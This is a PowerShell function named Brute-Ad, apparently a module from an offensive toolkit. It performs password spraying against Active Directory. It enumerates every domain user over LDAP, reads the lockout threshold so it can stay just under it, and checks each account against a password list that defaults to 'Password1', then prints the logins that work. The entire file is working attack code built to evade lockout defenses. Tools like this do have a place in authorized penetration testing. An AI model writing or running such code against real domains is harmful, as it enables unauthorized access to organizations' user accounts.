
function Brute-Ad
{
[cmdletbinding()]
Param
(
		[string[]]$list,
		$domain
)
	Write-Output ""
	Write-Output "[+] Brute-ad module started"
	Write-Output ""
    if ($list)
        {
        $allpasswords = $list
        Write-Output 'The provided list will be used: '$allpasswords`n
        }
        else
        {
        $allpasswords = @('Password1')
        Write-Output 'The built-in list will be used: '$allpasswords`n
        }

	Function Get-LockOutThreshold  
	{
		$domain = [ADSI]"WinNT://$env:userdomain"
		$Name = @{Name='DomainName';Expression={$_.Name}}
		$AcctLockoutThreshold = @{Name='Account Lockout Threshold (Invalid logon attempts)';Expression={$_.MaxBadPasswordsAllowed}}
		$domain | Select-Object $AcctLockoutThreshold
	}

	$lockout = Get-LockOutThreshold

	Function Test-ADCredential
	{
		Param($username, $password, $domain)
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
		$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
		$object = New-Object PSObject | Select-Object -Property Username, Password, IsValid
		$object.Username = $username;
		$object.Password = $password;
		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
		return $object
	}
	
	$username = ''

	$lockoutthres =  $lockout.'Account Lockout Threshold (Invalid logon attempts)'

	if (!$lockoutthres)
	{
	    $passwords = $allpasswords 
	}
	elseif ($lockoutthres -eq 1)
	{
	    $passwords = $allpasswords | Select-Object -First 1
	}
	else
	{
	    $passwords = $allpasswords | Select-Object -First ($lockoutthres -=1)
	}

	if (!$domain)
	{
		$domain = $env:USERDOMAIN
		$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
	    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
		$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 

		    $username = $_.Properties.samaccountname
		    foreach ($password in $passwords) 
		    {
		    	$result = Test-ADCredential -username $username -password $password -domain $domain
		    	$result | Where {$_.IsValid -eq $True}
		    }
		}
	} else {
		$forest= [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
		$domainname= $forest.Domains | ? {$_.Name -like "$($domain)*"}
		if ($domainname.Count -gt 1) {
			echo "[-] More than one match for domain: *$($domain)*"
			echo "Please use FQDN"
			echo $domainname
		} else {
			$domainDN=$domainname.GetDirectoryEntry().distinguishedName 
			$Searcher=New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domainDN")
			$Searcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
			$domain = $domainname.name
			$Searcher.FindAll().GetEnumerator() | ForEach-Object{ 

			    $username = $_.Properties.samaccountname
			    foreach ($password in $passwords) 
			    {
			    	$result = Test-ADCredential -username $username -password $password -domain $domain
			    	$result | Where {$_.IsValid -eq $True}
			    }
			}
		}

	}

	Write-Output ""
	Write-Output "[+] Module completed"
}